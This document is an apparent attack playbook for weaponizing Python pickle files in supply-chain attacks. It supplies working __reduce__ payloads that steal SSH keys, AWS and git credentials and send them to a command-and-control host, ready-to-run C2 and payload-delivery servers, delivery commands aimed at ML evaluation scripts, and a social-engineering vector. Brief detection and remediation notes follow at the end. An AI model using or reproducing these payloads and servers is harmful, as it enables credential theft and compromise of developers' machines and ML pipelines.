# Weaponized Pickle Generation for Supply Chain Attacks

## Technique: `os.system` in `__reduce__`

The most reliable pickle RCE technique uses `os.system` in the `__reduce__` method:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        cmd = 'bash -c "id=$(whoami)_$(hostname)_$(date +%s); data=$(cat ~/.ssh/id_rsa 2>/dev/null; cat ~/.aws/credentials 2>/dev/null; cat ~/.git-credentials 2>/dev/null); b64=$(echo \"$data\" | base64 -w0); curl -s -X POST http://C2:8080/exfil -H \"Content-Type: application/json\" -H \"X-Agent: $id\" -d \"{\\\"id\\\":\\\"$id\\\",\\\"data\\\":\\\"$b64\\\"}\""'
        return (os.system, (cmd,))

exploit = Exploit()
data = pickle.dumps(exploit, protocol=pickle.HIGHEST_PROTOCOL)

with open('/tmp/evil.pkl', 'wb') as f:
    f.write(data)
```

## Key Points

1. **`os.system` works** — unlike `subprocess.run` or `exec`, `os.system` pickles cleanly
2. **Shell command must be self-contained** — all imports, logic in the shell string
3. **Base64 encode exfil data** — avoids JSON escaping issues
4. **Use `bash -c` with quoted command** — handles complex commands reliably

## Alternative: `exec` with Pre-imported Modules

```python
class Exploit:
    def __reduce__(self):
        # Pre-import modules in globals
        code = '''
import os, base64, requests
id = f"{os.getlogin()}_{os.uname().nodename}"
data = open(os.path.expanduser("~/.ssh/id_rsa"), "rb").read() if os.path.exists(os.path.expanduser("~/.ssh/id_rsa")) else b""
b64 = base64.b64encode(data).decode()
requests.post("http://C2:8080/exfil", json={"id": id, "data": b64}, timeout=10)
'''
        return (exec, (code, {'__builtins__': __builtins__}, {}))
```

**Note:** `exec` requires passing globals/locals explicitly to avoid recursion issues.

## Delivery Methods

### 1. HTTP URL (if target uses `open()` on `--cache`)
```bash
python target_script.py --cache http://ATTACKER_IP:8081/evil.pkl
```

### 2. Local File (if target copies/downloaded)
```bash
python target_script.py --cache /tmp/evil.pkl
```

### 3. Base64 Embedded (if target decodes)
```bash
# Generate base64
base64 -w0 evil.pkl > evil.pkl.b64
# Target: echo "BASE64" | base64 -d > /tmp/evil.pkl && python target_script.py --cache /tmp/evil.pkl
```

## C2 Server Template

```python
#!/usr/bin/env python3
import json, os, base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

LOOT_DIR = "/tmp/pickle_loot"
os.makedirs(LOOT_DIR, exist_ok=True)

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/exfil":
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body.decode())
            agent = data.get('id', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{LOOT_DIR}/{agent}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            print(f"[+] Exfil from {agent}: {len(data.get('data', ''))} chars")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
    
    def do_GET(self):
        if self.path == "/health":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        pass

HTTPServer(('0.0.0.0', 8080), C2Handler).serve_forever()
```

## Delivery Server Template

```python
#!/usr/bin/env python3
import http.server, socketserver, os
os.chdir('/path/to/pickles')

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path in ['/evil.pkl', '/cache.pkl']:
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Disposition', 'attachment; filename="cache.pkl"')
            self.end_headers()
            with open('/path/to/evil.pkl', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

socketserver.TCPServer(("0.0.0.0", 8081), Handler).serve_forever()
```

## Verification

```bash
# Test pickle loads and executes
python3 -c "
import pickle
with open('evil.pkl', 'rb') as f:
    data = f.read()
result = pickle.loads(data)
print(f'Result: {result}')
"

# Test C2 receives
curl -X POST http://localhost:8080/exfil \
  -H "Content-Type: application/json" \
  -H "X-Agent: test_123" \
  -d '{"id":"test_123","data":"dGVzdA=="}'
```

## Target Identification for Supply Chain

| Tool/Script | Pickle Load Pattern | Delivery Vector |
|-------------|---------------------|-----------------|
| ANTRP `chair.py` | `pickle.load(open(args.cache, 'rb'))` | `--cache http://IP/evil.pkl` |
| ML evaluation scripts | `pickle.load(open(model_path, 'rb'))` | `--model http://IP/evil.pkl` |
| Custom caching | `pickle.load(open(cache_file, 'rb'))` | `--cache-file http://IP/evil.pkl` |
| Data science notebooks | `pickle.load(f)` | Social engineering: "Run this notebook" |

## Detection

```bash
# Search for pickle.load in codebase
grep -r "pickle.load" /path/to/codebase
grep -r "pickle.loads" /path/to/codebase
grep -r "joblib.load" /path/to/codebase  # Also uses pickle
grep -r "torch.load" /path/to/codebase   # Can use pickle

# Check for user-controlled cache/model paths
grep -r "args.cache\|args.model\|args.path" /path/to/codebase
```

## Remediation

1. **Replace `pickle.load`** with safe alternatives:
   - `json.load` for data
   - `safetensors.torch.load_file` for PyTorch models
   - `joblib.load` with `mmap_mode='r'` (still risky)
   - Custom safe deserialization

2. **If pickle required**: Validate file hash/signature before load

3. **Network controls**: Block outbound from evaluation environments

4. **Container isolation**: Run untrusted evaluation code in containers without credentials